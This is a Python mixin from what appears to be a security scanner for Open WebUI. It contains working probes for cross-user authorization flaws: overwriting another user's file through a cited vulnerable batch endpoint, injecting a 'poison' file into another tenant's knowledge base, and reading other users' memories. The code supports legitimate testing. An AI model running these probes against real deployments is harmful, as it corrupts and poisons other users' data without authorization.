"""
Open WebUI Lifecycle Mixin.
Handles sharing, revocation, cross-user mutations, resource enumeration, and teardown.
"""

from __future__ import annotations

import logging
from typing import Dict, Any, List, Optional

from adapters.base import UserSession

logger = logging.getLogger("firedamp.adapters.openwebui.lifecycle")


class OpenWebUILifecycleMixin:
    """Resource sharing, ACL revocation, write mutations, enumeration, and cleanup."""

    def overwrite_resource(
        self,
        base_url: str,
        session: UserSession,
        resource_ref: str,
        payload: str,
        collection_name: Optional[str] = None,
        file_model: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Attempts to overwrite another user's file via the documented vulnerable endpoint:
        POST /api/v1/retrieval/process/files/batch (GHSA-jjp7-g2jw-wh3j / CVE-2026-28788).
        Strictly conforms to upstream BatchProcessFilesForm(files: List[FileModel], collection_name: str).

        Fails closed without sending a batch request if:
        - file_model is invalid (not a dict, id does not match resource_ref, or missing/invalid user_id)
        - metadata retrieval fails or returns an invalid/mismatched model when file_model is omitted
        - explicit collection_name is missing, blank, or invalid
        """
        base = base_url.rstrip("/")

        # 1. Obtain authoritative FileModel:
        # Either passed explicitly or retrieved using authorized read access (GET /api/v1/files/{file_id})
        target_model: Optional[Dict[str, Any]] = None
        if file_model is not None:
            if not isinstance(file_model, dict):
                logger.warning(f"Rejecting overwrite_resource: file_model for '{resource_ref}' must be a dictionary")
                return {"error": "Invalid file_model: must be a dictionary"}
            if file_model.get("id") != resource_ref:
                logger.warning(
                    f"Rejecting overwrite_resource: file_model id '{file_model.get('id')}' "
                    f"does not match resource_ref '{resource_ref}'"
                )
                return {"error": f"Invalid file_model: id '{file_model.get('id')}' does not match resource_ref '{resource_ref}'"}
            user_id = file_model.get("user_id")
            if not isinstance(user_id, str) or not user_id.strip():
                logger.warning(f"Rejecting overwrite_resource: file_model for '{resource_ref}' missing or invalid user_id")
                return {"error": f"Invalid file_model: missing or invalid user_id for resource '{resource_ref}'"}
            target_model = dict(file_model)
        else:
            fetched = self.get_file_metadata(base_url, session, resource_ref)
            if not isinstance(fetched, dict):
                logger.warning(f"Rejecting overwrite_resource: failed to retrieve authoritative metadata for '{resource_ref}'")
                return {"error": f"Failed to retrieve authoritative file metadata for '{resource_ref}'"}
            if fetched.get("id") != resource_ref:
                logger.warning(
                    f"Rejecting overwrite_resource: retrieved metadata id '{fetched.get('id')}' "
                    f"does not match resource_ref '{resource_ref}'"
                )
                return {"error": f"Retrieved metadata id '{fetched.get('id')}' does not match resource_ref '{resource_ref}'"}
            user_id = fetched.get("user_id")
            if not isinstance(user_id, str) or not user_id.strip():
                logger.warning(f"Rejecting overwrite_resource: retrieved metadata for '{resource_ref}' missing or invalid user_id")
                return {"error": f"Retrieved metadata for '{resource_ref}' missing or invalid user_id"}
            target_model = dict(fetched)

        # Preserve authoritative fields and update only data.content
        file_payload = dict(target_model)
        existing_data = dict(file_payload.get("data") or {}) if isinstance(file_payload.get("data"), dict) else {}
        existing_data["content"] = payload
        file_payload["data"] = existing_data

        # 2. Validate explicit collection_name (knowledge-base ID)
        # The target collection MUST be explicitly supplied. We do NOT infer the collection
        # from the requesting session's knowledge_ids (which may belong to an attacker) nor
        # from unverified file metadata.
        if not isinstance(collection_name, str) or not collection_name.strip():
            logger.warning(
                f"Rejecting overwrite_resource: missing or invalid explicit collection_name for resource '{resource_ref}'"
            )
            return {"error": f"Invalid collection_name: explicit non-empty collection_name required for resource '{resource_ref}'"}
        target_collection = collection_name.strip()

        batch_payload = {
            "files": [file_payload],
            "collection_name": target_collection,
        }
        res = self._json_request(
            f"{base}/api/v1/retrieval/process/files/batch",
            method="POST",
            data=batch_payload,
            headers=session.headers,
        )
        return res

    def read_file_content(
        self,
        base_url: str,
        session: UserSession,
        file_id: str,
    ) -> Optional[str]:
        """
        Reads back an authorized user's indexed file content (File.data.content)
        through legitimate verification routes:
        1. Primary: GET /api/v1/files/{file_id}/data/content (returns File.data.content from database)
        2. Fallback: GET /api/v1/files/{file_id} ONLY when response genuinely contains data.content

        SAFETY RULE: Never falls back to GET /api/v1/files/{file_id}/content (raw binary upload),
        because raw uploads are not mutated by File.data.content overwrites and would cause false
        clean verdicts. If indexed-content endpoints are inaccessible, returns None.
        """
        base = base_url.rstrip("/")
        # 1. Primary: GET /api/v1/files/{id}/data/content (File.data.content)
        res = self._json_request(
            f"{base}/api/v1/files/{file_id}/data/content",
            method="GET",
            headers=session.headers,
        )
        if isinstance(res, str) and res:
            return res
        if isinstance(res, dict):
            if "content" in res and isinstance(res["content"], str):
                return res["content"]
            if "data" in res and isinstance(res["data"], dict) and "content" in res["data"]:
                return str(res["data"]["content"])

        # 2. Fallback: GET /api/v1/files/{id} (ONLY when genuinely containing data.content)
        res_info = self._json_request(
            f"{base}/api/v1/files/{file_id}",
            method="GET",
            headers=session.headers,
        )
        if isinstance(res_info, dict):
            data_dict = res_info.get("data")
            if isinstance(data_dict, dict) and "content" in data_dict:
                return str(data_dict["content"])

        # Indexed content could not be established; never use raw /content endpoint
        return None

    def inject_into_collection(
        self,
        base_url: str,
        session: UserSession,
        target_collection_id: str,
        document: Any,
    ) -> Dict[str, Any]:
        """
        Attempts to inject an unauthorized file into another tenant's knowledge collection.
        Probes POST /api/v1/knowledge/{collection_id}/file/add with Bob's credentials.
        """
        if not isinstance(target_collection_id, str) or not target_collection_id.strip():
            logger.warning("Rejecting inject_into_collection: missing or invalid explicit target_collection_id")
            return {"error": "Invalid target_collection_id: explicit non-empty collection ID required"}

        base = base_url.rstrip("/")
        filename = f"poison_{getattr(document, 'category', 'injection')}.md"
        content_bytes = document.content.encode("utf-8") if hasattr(document, "content") else str(document).encode("utf-8")

        upload_res = self._multipart_upload(
            f"{base}/api/v1/files/",
            filename=filename,
            content=content_bytes,
            headers=session.headers,
        )
        file_id = upload_res.get("id") if isinstance(upload_res, dict) else None
        if not isinstance(file_id, str) or not file_id.strip():
            return upload_res if isinstance(upload_res, dict) else {"error": "File upload returned a malformed response"}
        file_id = file_id.strip()

        # Preserve the upload handle even if linking fails, so the caller can
        # verify ownership and delete this exact newly-created Bob-owned file.
        if not isinstance(session.metadata, dict):
            return {"error": "Session metadata unavailable after upload", "uploaded_file_id": file_id}
        file_ids = session.metadata.setdefault("file_ids", [])
        if not isinstance(file_ids, list):
            return {"error": "Session file_ids metadata is malformed after upload", "uploaded_file_id": file_id}
        if file_id not in file_ids:
            file_ids.append(file_id)

        # Attempt to link into Alice's knowledge base without permissions.
        try:
            link_res = self._json_request(
                f"{base}/api/v1/knowledge/{target_collection_id.strip()}/file/add",
                method="POST",
                data={"file_id": file_id},
                headers=session.headers,
            )
        except Exception as exc:
            return {"error": f"Knowledge-base linking request failed: {exc}", "uploaded_file_id": file_id}
        if isinstance(link_res, dict):
            return {**link_res, "uploaded_file_id": file_id}
        return {"error": "Knowledge-base linking returned a malformed response", "uploaded_file_id": file_id}

    def create_user_memory(
        self,
        base_url: str,
        session: UserSession,
        content: str,
    ) -> Dict[str, Any]:
        """Creates a persistent memory entry for the session in Open WebUI."""
        base = base_url.rstrip("/")
        return self._json_request(
            f"{base}/api/v1/memories/add",
            method="POST",
            data={"content": content},
            headers=session.headers,
        )

    def get_user_memories(
        self,
        base_url: str,
        session: UserSession,
        target_user_id: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Fetches memory entries; probes specific user memory route if target_user_id provided."""
        base = base_url.rstrip("/")
        path = f"/api/v1/memories/{target_user_id}" if target_user_id else "/api/v1/memories/"
        res = self._json_request(f"{base}{path}", method="GET", headers=session.headers)
        if isinstance(res, list):
            return res
        if isinstance(res, dict) and "data" in res:
            return res.get("data", [])
        return []

    def execute_tool_action(
        self,
        base_url: str,
        session: UserSession,
        tool_name: str,
        tool_input: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Executes a tool call under session credentials."""
        base = base_url.rstrip("/")
        return self._json_request(
            f"{base}/api/v1/tools/{tool_name}/execute",
            method="POST",
            data={"input": tool_input},
            headers=session.headers,
        )

    def enumerate_resources(
        self,
        base_url: str,
        session: UserSession,
    ) -> List[str]:
        """
        Lists all file and knowledge IDs returned by the target platform to this session.
        Probes for CVE-2026-44557, CVE-2026-54016, and CVE-2026-45301.
        """
        base = base_url.rstrip("/")
        discovered_ids: List[str] = []

        # 1. Enumerate files API
        files_res = self._json_request(
            f"{base}/api/v1/files/",
            method="GET",
            headers=session.headers,
        )
        if isinstance(files_res, list):
            for item in files_res:
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))
        elif isinstance(files_res, dict) and "data" in files_res:
            for item in files_res.get("data", []):
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))

        # 2. Enumerate knowledge bases
        kb_res = self._json_request(
            f"{base}/api/v1/knowledge/",
            method="GET",
            headers=session.headers,
        )
        if isinstance(kb_res, list):
            for item in kb_res:
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))
        elif isinstance(kb_res, dict) and "data" in kb_res:
            for item in kb_res.get("data", []):
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))

        return discovered_ids

    def get_file_metadata(
        self,
        base_url: str,
        session: UserSession,
        file_id: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Retrieves authoritative server-side file metadata via GET /api/v1/files/{file_id}.
        """
        base = base_url.rstrip("/")
        try:
            res = self._json_request(
                f"{base}/api/v1/files/{file_id}",
                method="GET",
                headers=session.headers,
            )
            if isinstance(res, dict) and "error" not in res and res.get("id") == file_id:
                return res
            return None
        except Exception as exc:
            logger.debug(f"Failed to fetch file metadata for {file_id}: {exc}")
            return None

    def get_accessible_knowledge_bases(
        self,
        base_url: str,
        session: UserSession,
    ) -> Optional[List[str]]:
        """
        Enumerates all knowledge base IDs accessible to the given user session.
        Paginates GET /api/v1/knowledge/?page={page} (default page size 30).
        Returns:
            - List[str] (which may be []): when enumeration completes successfully and matches upstream total.
            - None: when enumeration cannot be verified (HTTP error, malformed response, incomplete pagination,
                    shifted total, premature empty page, duplicate IDs across pages, unbounded limit reached,
                    or transport failure).
        """
        if not session or not getattr(session, "headers", None):
            return None

        base = base_url.rstrip("/")
        collected_kb_ids: List[str] = []
        seen_kb_ids: set = set()
        expected_total: Optional[int] = None
        page = 1
        max_pages = 100

        while True:
            if page > max_pages:
                logger.warning(
                    f"Exceeded max pagination limit ({max_pages} pages) fetching accessible knowledge bases"
                )
                return None

            url = f"{base}/api/v1/knowledge/?page={page}"
            try:
                res = self._json_request(url, method="GET", headers=session.headers)
            except Exception as exc:
                logger.debug(f"Exception fetching accessible knowledge bases page {page}: {exc}")
                return None

            if not isinstance(res, dict) or "error" in res:
                logger.debug(f"Error response fetching accessible knowledge bases page {page}: {res}")
                return None

            raw_total = res.get("total")
            if isinstance(raw_total, bool) or not isinstance(raw_total, int) or raw_total < 0:
                logger.debug(f"Invalid or missing 'total' field in accessible KBs response: {raw_total}")
                return None

            items = res.get("items")
            if not isinstance(items, list):
                logger.debug(f"Invalid or missing 'items' list in accessible KBs response: {type(items)}")
                return None

            if page == 1:
                expected_total = raw_total
                if expected_total == 0:
                    if len(items) == 0:
                        return []
                    logger.debug("Accessible KBs reported total=0 but items list is non-empty")
                    return None
                if expected_total > max_pages * 30:
                    logger.warning(
                        f"Accessible KBs reported total={expected_total} exceeding max pagination capacity"
                    )
                    return None
            else:
                if raw_total != expected_total:
                    logger.debug(
                        f"Total count shifted during pagination for accessible KBs: expected {expected_total}, got {raw_total}"
                    )
                    return None

            if not items and len(collected_kb_ids) < expected_total:
                logger.debug(
                    f"Empty items returned for accessible KBs on page {page} before reaching total {expected_total}"
                )
                return None

            for item in items:
                kbid = None
                if isinstance(item, dict):
                    kbid = item.get("id")
                elif isinstance(item, str):
                    kbid = item
                else:
                    logger.debug(f"Malformed item type in accessible KBs: {type(item)}")
                    return None

                if not kbid or not isinstance(kbid, str) or not kbid.strip():
                    logger.debug("Missing or invalid KB ID in accessible KBs")
                    return None

                clean_kbid = kbid.strip()
                if clean_kbid in seen_kb_ids:
                    logger.warning(
                        f"Duplicate KB ID '{clean_kbid}' detected across pages during candidate enumeration"
                    )
                    return None

                seen_kb_ids.add(clean_kbid)
                collected_kb_ids.append(clean_kbid)

            if len(collected_kb_ids) >= expected_total:
                if len(collected_kb_ids) > expected_total:
                    logger.debug(
                        f"Inconsistent pagination: collected {len(collected_kb_ids)} KBs, expected total {expected_total}"
                    )
                    return None
                return collected_kb_ids

            page += 1

    def get_knowledge_base_metadata(
        self,
        base_url: str,
        session: UserSession,
        knowledge_id: str,
    ) -> Optional[Dict[str, Any]]:
        """Fetch exact server-side metadata for a KB, including its owner user_id."""
        if not session or not getattr(session, "headers", None) or not isinstance(knowledge_id, str) or not knowledge_id.strip():
            return None
        base = base_url.rstrip("/")
        try:
            response = self._json_request(
                f"{base}/api/v1/knowledge/{knowledge_id.strip()}",
                method="GET",
                headers=session.headers,
            )
        except Exception as exc:
            logger.debug("Failed to retrieve knowledge-base metadata for %s: %s", knowledge_id, exc)
            return None
        if not isinstance(response, dict) or "error" in response or response.get("id") != knowledge_id.strip():
            return None
        owner_id = response.get("user_id")
        if not isinstance(owner_id, str) or not owner_id.strip():
            return None
        return response

    def get_knowledge_base_files(
        self,
        base_url: str,
        session: UserSession,
        knowledge_id: str,
    ) -> Optional[List[str]]:
        """
        Retrieves the complete, verified list of file IDs belonging to the given knowledge base.
        Paginates GET /api/v1/knowledge/{id}/files?page={page} (default page size 30).
        Returns:
            - List[str] (which may be []): when enumeration completes successfully and matches upstream total.
            - None: when membership cannot be verified (HTTP error, malformed response, incomplete pagination,
                    shifted total, premature empty page, duplicate IDs within or across pages, unbounded loop limit reached,
                    or transport failure).
        """
        if not session or not getattr(session, "headers", None) or not knowledge_id:
            return None

        clean_kb_id = knowledge_id.strip()
        if not clean_kb_id:
            return None

        base = base_url.rstrip("/")
        collected_file_ids: List[str] = []
        seen_file_ids: set = set()
        expected_total: Optional[int] = None
        page = 1
        max_pages = 100

        while True:
            if page > max_pages:
                logger.warning(
                    f"Exceeded max pagination limit ({max_pages} pages) fetching files for KB '{clean_kb_id}'"
                )
                return None

            url = f"{base}/api/v1/knowledge/{clean_kb_id}/files?page={page}"
            try:
                res = self._json_request(url, method="GET", headers=session.headers)
            except Exception as exc:
                logger.debug(f"Exception fetching files for knowledge base {clean_kb_id} page {page}: {exc}")
                return None

            if not isinstance(res, dict) or "error" in res:
                logger.debug(f"Error response fetching files for knowledge base {clean_kb_id} page {page}: {res}")
                return None

            raw_total = res.get("total")
            if isinstance(raw_total, bool) or not isinstance(raw_total, int) or raw_total < 0:
                logger.debug(f"Invalid or missing 'total' field in response for KB {clean_kb_id}: {raw_total}")
                return None

            items = res.get("items")
            if not isinstance(items, list):
                logger.debug(f"Invalid or missing 'items' list in response for KB {clean_kb_id}: {type(items)}")
                return None

            if page == 1:
                expected_total = raw_total
                if expected_total == 0:
                    if len(items) == 0:
                        return []
                    logger.debug(f"KB {clean_kb_id} reported total=0 but items list is non-empty")
                    return None
                if expected_total > max_pages * 30:
                    logger.warning(
                        f"KB {clean_kb_id} reported total={expected_total} exceeding max pagination capacity"
                    )
                    return None
            else:
                if raw_total != expected_total:
                    logger.debug(
                        f"Total count shifted during pagination for KB {clean_kb_id}: expected {expected_total}, got {raw_total}"
                    )
                    return None

            if not items and len(collected_file_ids) < expected_total:
                logger.debug(
                    f"Empty items returned for KB {clean_kb_id} on page {page} before reaching total {expected_total}"
                )
                return None

            for item in items:
                fid = None
                if isinstance(item, dict):
                    nested_file = item.get("file")
                    if nested_file is not None and not isinstance(nested_file, dict):
                        logger.debug("Malformed nested file metadata in KB %s", clean_kb_id)
                        return None

                    fid = item.get("id") or (nested_file or {}).get("id") or item.get("file_id")
                elif isinstance(item, str):
                    fid = item
                else:
                    logger.debug("Malformed item type in KB %s: %s", clean_kb_id, type(item))
                    return None

                if not fid or not isinstance(fid, str) or not fid.strip():
                    logger.debug(f"Missing or invalid file ID in items for KB {clean_kb_id}")
                    return None

                clean_fid = fid.strip()
                if clean_fid in seen_file_ids:
                    logger.warning(
                        f"Duplicate file ID '{clean_fid}' detected in KB '{clean_kb_id}' during file enumeration"
                    )
                    return None

                seen_file_ids.add(clean_fid)
                collected_file_ids.append(clean_fid)

            if len(collected_file_ids) >= expected_total:
                if len(collected_file_ids) > expected_total:
                    logger.debug(
                        f"Inconsistent pagination: collected {len(collected_file_ids)} items, expected total {expected_total}"
                    )
                    return None
                return collected_file_ids

            page += 1

    def delete_file(
        self,
        base_url: str,
        session: UserSession,
        file_id: str,
    ) -> bool:
        """
        Deletes a single file resource via DELETE /api/v1/files/{file_id}.
        Upstream Open WebUI v0.8.5/v0.8.6 returns exactly: {"message": "File deleted successfully"}.
        """
        if not session or not session.headers or not file_id:
            return False
        base = base_url.rstrip("/")
        try:
            res = self._json_request(
                f"{base}/api/v1/files/{file_id}",
                method="DELETE",
                headers=session.headers,
            )
            if not isinstance(res, dict) or not res:
                return False

            # HTTPError or transport exceptions caught by _json_request return {"error": ...}
            if "error" in res or res.get("code") in (400, 401, 403, 404, 500):
                return False

            # Upstream Open WebUI v0.8.5 and v0.8.6 response contract:
            # Exactly {"message": "File deleted successfully"}
            msg = res.get("message")
            if isinstance(msg, str):
                normalized_msg = " ".join(msg.strip().lower().split())
                if normalized_msg == "file deleted successfully":
                    return True

            return False
        except Exception as exc:
            logger.debug(f"Failed to delete file {file_id}: {exc}")
            return False

    def share_resource(
        self,
        base_url: str,
        owner: UserSession,
        resource_ref: str,
        grantee: UserSession,
    ) -> Dict[str, Any]:
        """Grants access to a knowledge collection for the grantee session."""
        base = base_url.rstrip("/")
        grantee_id = grantee.metadata.get("email", grantee.username)

        # Update access_control list for knowledge base
        return self._json_request(
            f"{base}/api/v1/knowledge/{resource_ref}/update",
            method="POST",
            data={
                "access_control": {
                    "read": {"user_ids": [grantee_id], "group_ids": []},
                    "write": {"user_ids": [], "group_ids": []},
                }
            },
            headers=owner.headers,
        )

    def revoke_resource(
        self,
        base_url: str,
        owner: UserSession,
        resource_ref: str,
        grantee: UserSession,
    ) -> Dict[str, Any]:
        """Revokes all access grants from the grantee on the target resource."""
        base = base_url.rstrip("/")
        return self._json_request(
            f"{base}/api/v1/knowledge/{resource_ref}/update",
            method="POST",
            data={"access_control": None},
            headers=owner.headers,
        )

    def cleanup(self, base_url: str, session: UserSession) -> None:
        """Clean only current-run files registered as disposable after owner re-verification.

        Ordinary files and pre-existing knowledge bases are never deleted here. A
        KB may contain user data beyond the disposable file, so generic cleanup
        intentionally does not issue knowledge-base DELETE requests.
        """
        from probes.disposable_registry import _TRUSTED_SCAN_REGISTRY

        metadata = session.metadata if isinstance(session.metadata, dict) else {}
        run_id = metadata.get("run_id")
        expected_owner_id = metadata.get("user_id")
        disposable_ids = metadata.get("disposable_file_ids", [])
        if not isinstance(run_id, str) or not run_id.strip():
            logger.warning("Cleanup skipped for %s: missing scan run ID", session.username)
            return
        if not isinstance(expected_owner_id, str) or not expected_owner_id.strip():
            logger.warning("Cleanup skipped for %s: missing expected server owner ID", session.username)
            return
        if not isinstance(disposable_ids, list):
            logger.warning("Cleanup skipped for %s: disposable_file_ids metadata is malformed", session.username)
            return

        retained: List[str] = []
        try:
            authenticated_id = self.get_authenticated_user_id(base_url, session)
        except Exception as exc:
            logger.warning("Cleanup skipped for %s: authentication verification failed: %s", session.username, exc)
            return
        if authenticated_id != expected_owner_id:
            logger.warning("Cleanup skipped for %s: authenticated identity did not match expected owner", session.username)
            return

        for candidate in disposable_ids:
            if not isinstance(candidate, str) or not candidate.strip():
                continue
            file_id = candidate.strip()
            if _TRUSTED_SCAN_REGISTRY.is_cleaned_up(run_id, file_id, session.username):
                continue
            if not _TRUSTED_SCAN_REGISTRY.is_registered(run_id, file_id, session.username):
                logger.warning("Cleanup refused unregistered resource %s for %s", file_id, session.username)
                retained.append(file_id)
                continue
            try:
                file_meta = self.get_file_metadata(base_url, session, file_id)
                if (
                    not isinstance(file_meta, dict)
                    or file_meta.get("id") != file_id
                    or file_meta.get("user_id") != expected_owner_id
                ):
                    logger.warning("Cleanup refused %s: server-side ownership could not be reverified", file_id)
                    retained.append(file_id)
                    continue
                if self.delete_file(base_url, session, file_id):
                    _TRUSTED_SCAN_REGISTRY.mark_cleaned_up(run_id, file_id)
                    file_ids = metadata.get("file_ids", [])
                    if isinstance(file_ids, list):
                        metadata["file_ids"] = [item for item in file_ids if item != file_id]
                    logger.info("Deleted registered disposable file %s for %s", file_id, session.username)
                else:
                    logger.warning("Cleanup failed for registered disposable file %s", file_id)
                    retained.append(file_id)
            except Exception as exc:
                logger.warning("Cleanup failed for registered disposable file %s: %s", file_id, exc)
                retained.append(file_id)
        metadata["disposable_file_ids"] = retained
        logger.info("Safe disposable cleanup completed for %s; %d resource(s) retained for review", session.username, len(retained))

